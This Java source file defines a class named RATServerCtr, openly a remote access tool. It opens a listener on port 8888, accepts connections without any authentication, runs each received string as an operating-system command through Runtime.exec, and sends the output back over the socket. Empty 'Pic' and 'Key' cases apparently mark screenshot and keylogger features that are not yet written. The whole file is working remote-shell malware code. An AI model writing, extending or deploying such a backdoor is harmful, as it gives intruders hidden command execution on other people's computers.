package controllers;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.ObjectOutputStream;
import java.io.OutputStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.ArrayList;
import java.util.Arrays;
import views.RATServerView;

/**
 *
 * @author gbrid
 */
public class RATServerCtr {
    private int port;
    private String host;
    private ServerSocket myServer;
    private ArrayList<Socket> list;
    private static Socket s;

    public RATServerCtr() {
        port = 8888;
        host = "localhost";
        list = new ArrayList<>();
        openSocket();
        while(true) {
            try {
                s = myServer.accept();
                list.add(s);
                execute(s);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }
    
    public void sendResult(String res) {
        try {
            ObjectOutputStream oos = new ObjectOutputStream(list.get(list.size()-1).getOutputStream());
            oos.writeObject(res);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void execute (Socket s) {
        try {
            sendResult("ok");
            String mode = getInput(s);
            new RATServerView().showMessage(mode);
            switch (mode) {
                case "Pic":
                    
                    break;
                case "Key":
                    
                    break;
                default:
                    sendResult("ok");
                    commandHandler(mode);
                    break;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void openSocket() {
        try {
            myServer = new ServerSocket(port);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public String getInput(Socket s) throws IOException {
        InputStream ips = s.getInputStream();
        DataInputStream dis = new DataInputStream(ips);
        String input = dis.readUTF();
        return input;
    }
    
    public void CommandRes(String res) {
        try {
            OutputStream ops = s.getOutputStream();
            DataOutputStream dos = new DataOutputStream(ops);
            dos.writeUTF(res);
            dos.flush();
        } catch (Exception e) {
        }
    }
    
    public void commandHandler(String command) throws IOException {
        String c = command;
        try {
            String line = null;
            Process proc = Runtime.getRuntime().exec(c);
            BufferedReader input = new BufferedReader(new InputStreamReader(proc.getInputStream()));
            while((line = input.readLine()) != null) {
                CommandRes(Arrays.toString(line.split("\s+")));
                System.out.println(Arrays.toString(line.split("\s+")));
            }
            input.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
